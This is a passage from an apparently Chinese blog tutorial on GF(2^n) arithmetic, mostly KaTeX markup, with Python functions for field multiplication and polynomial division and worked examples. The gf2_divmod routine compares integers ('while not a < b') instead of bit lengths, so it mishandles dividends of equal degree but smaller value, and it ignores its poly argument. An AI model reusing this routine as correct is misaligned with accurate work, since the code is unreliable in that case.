class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p>
<p>GF (2^n) 上的乘法即为 GF (2) 上多项式的乘法，具体是将 GF (2) 上的两个多项式相乘，但是两个多项式相乘之后的次数可能大于等于 n，因此在计算两个多项式的乘积之后，还需要模一个 GF (2) 上的 n 次不可约多项式，来保证得到的多项式次数小于 n</p>
<p>在具体实现中，模 n 次不可约多项式的操作可以分解到每一次乘 x 的运算中，即乘 x 的运算通过左移一位后再根据条件按位异或给定的不可约多项式对应的 n 位二进制数的后 n-1 位实现。乘 x 的更高次幂可以通过重复使用该方法实现，这样一来，GF (2^n) 上的乘法结果可由多个中间结果相加得到。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">gf2_mul</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> poly<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>     <span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="3"></td><td><pre>    :param a: 被乘数</pre></td></tr><tr><td data-num="4"></td><td><pre>    :param b: 乘数</pre></td></tr><tr><td data-num="5"></td><td><pre>    :param poly: 不可约多项式</pre></td></tr><tr><td data-num="6"></td><td><pre>    :return: 积</pre></td></tr><tr><td data-num="7"></td><td><pre>    """</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    ans <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    digit_1 <span class="token operator">=</span> poly<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> b<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">if</span> b <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            ans <span class="token operator">=</span> ans <span class="token operator">^</span> a</pre></td></tr><tr><td data-num="13"></td><td><pre>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">>></span> <span class="token number">1</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">if</span> a <span class="token operator">>></span> digit_1<span class="token punctuation">:</span>  <span class="token comment"># 取出 a 的最高位</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            a <span class="token operator">=</span> a <span class="token operator">^</span> poly</pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">return</span> ans</pre></td></tr></table></figure><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>10</mn><msub><mn>1</mn><mn>2</mn></msub><mo>⨂</mo><mn>01</mn><msub><mn>1</mn><mn>2</mn></msub><mo>=</mo><mn>111</mn><msub><mn>1</mn><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">101_{2}\bigotimes011_{2}=1111_{2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨂</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<h2 id="有限域上的带余除法"><a class="anchor" href="#有限域上的带余除法">#</a> 有限域上的带余除法</h2>
<p>GF (2^n) 上的除法指 GF (2) 上多项式的带余除法，具体是将 GF (2) 上的两个多项式相除，得到商和余数</p>
<p>在具体实现中，令 a 为被除数，b 为除数，q 为商，r 为余数，且均为二进制数形式。将 q 的值初始化为 0，当 a 的比特长度大于等于 b 的比特长度时，b 左移 k 位后与 a 长度相等，此时将 q 与 1 左移 k 位后的值相加，将 a 与 b 左移 k  位后的值相减，再判断 a 与 b 的大小；若 a 大于等于 b，则重复以上步骤，直至 a 小于 b，此时 a 的值即为 r</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">gf2_divmod</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> poly<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="3"></td><td><pre>    :param a: 被除数</pre></td></tr><tr><td data-num="4"></td><td><pre>    :param b: 除数</pre></td></tr><tr><td data-num="5"></td><td><pre>    :param poly: 不可约多项式</pre></td></tr><tr><td data-num="6"></td><td><pre>    :return: 商，余数</pre></td></tr><tr><td data-num="7"></td><td><pre>    """</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 除数不能为 0</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">raise</span> ZeroDivisionError</pre></td></tr><tr><td data-num="10"></td><td><pre>    ans <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    digit_a<span class="token punctuation">,</span> digit_b <span class="token operator">=</span> a<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">while</span> <span class="token keyword">not</span> a <span class="token operator">&lt;</span> b<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        rec <span class="token operator">=</span> digit_a <span class="token operator">-</span> digit_b</pre></td></tr><tr><td data-num="14"></td><td><pre>        a <span class="token operator">=</span> a <span class="token operator">^</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;&lt;</span> rec<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        ans <span class="token operator">=</span> ans <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> rec<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        digit_a <span class="token operator">=</span> a<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> ans<span class="token punctuation">,</span> a</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="19"></td><td><pre># 不可约多项式 poly = 0b100011011</pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>0xde / 0xc6 = 0x01 ... 0x18</pre></td></tr><tr><td data-num="22"></td><td><pre>0x8c / 0x0a = 0x14 ... 0x04</pre></td></tr><tr><td data-num="23"></td><td><pre>0x3e / 0xa4 = 0x00 ... 0x3e</pre></td></tr><tr><td data-num="24"></td><td><pre>'''</span></pre></td></tr></table></figure><p>其实取模运算就相当于除法啦。多项式取模有一个简单的算法，重复用既约多项式剪掉最高次项。下面是一个极其简单的例子</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">(x^3+x^2+x+1)mod(x^3+x+1)=x^2
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>111</mn><msub><mn>1</mn><mn>2</mn></msub><mi>m</mi><mi>o</mi><mi>d</mi><mn>101</mn><msub><mn>1</mn><mn>2</mn></msub><mo>=</mo><mn>111</mn><msub><mn>1</mn><mn>2</mn></msub><mo>⊕</mo><mn>101</mn><msub><mn>1</mn><mn>2</mn></msub><mo>=</mo><mn>10</mn><msub><mn>0</mn><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">1111_{2}mod1011_{2}=1111_{2}⊕1011_{2}=100_{2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<h2 id="有限域多项式"><a class="anchor" href="#有限域多项式">#</a> 有限域多项式</h2>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy="false">)</mo><mtext>这是</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>n</mi></msup><mo stretchy="false">)</mo><mtext>的特例，</mtext><mi>p</mi><mo>=</mo><mn>2</mn><mtext>，</mtext><mi>n</mi><mo>=</mo><mn>8</mn><mtext>。例如多项式</mtext><mo>:</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mtext>，</mtext></mrow><annotation encoding="application/x-tex">GF(2^8)这是GF(p^n)的特例，p=2，n=8。例如多项式:f(x)=x^6+x^4+x^2+x+1，
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">8</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span 